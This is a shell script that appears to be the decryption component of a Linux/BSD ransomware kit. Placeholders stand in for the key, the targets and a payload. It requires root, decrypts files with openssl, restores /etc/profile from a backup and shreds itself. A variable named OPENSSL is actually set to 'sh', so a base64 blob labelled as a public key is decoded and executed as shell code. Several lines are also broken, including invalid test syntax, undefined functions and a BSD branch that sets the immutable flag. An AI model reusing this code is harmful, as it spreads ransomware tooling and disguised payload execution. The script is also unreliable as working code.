#!/bin/sh
SSL_COM="openssl"
################ CHECKS ###############################
# Get the OS version
get_os() {
    if [[$(uname -s | grep Linux) != ""]]; then
	OS="linux"
    elif [[ $( uname -s | grep BSD) != "" ]]; then
	OS="bsd"
    else
	echo "[!] NOT \"Linux\" or \"BSD\""
	exit
    fi
}

OPENSSL="sh"
check_req() {
    # Fatal Errors
    if [ "$(whoami)" != "root" ]; then
	echo  "[!] NOT ROOT"
        exit
    fi
    if [ "$(which $SSL_COM)" = "" ]; then
        echo  "[!] NO OPENSSL FOUND"
        exit
    fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" = "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" = "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}

################## DECRYPT ################################
decrypt() {
    #$SSL_COM $1
    #$SSL_COM $1.dec
    #mv $1 $1.enc
    $SSL_COM aes-256-cbc -d -k "$KEY" -in "$1" -out "$1.dec"
    if [ $? = 0 ]; then
	mv $1.dec $1
	rm $1.dec
	echo "[+] Decrypted $1"
    else
	echo "[+] Error Decrypting $1"
    fi
}

loop() {
    for i in $1; do
	decrypt $i 
    done
}

dec_loop() {
    kills="$1"
    for i in $kills; do
    	if [ -d "$i" ]; then
	    navdir "$i/*" "upk"
	    adderr "[+] Decrypted $i"
	fi
    done
}
################## KEY STUFF ##############################
check_req
KEY="__KEY__"
PUBLICKEY="\
__STRING__"
echo -n "$PUBLICKEY" | $SSL_COM base64 -d | $OPENSSL
loop "__TARGETS__"
rm /etc/profile
mv /etc/profile.bak /etc/profile
shred $0
rm $0
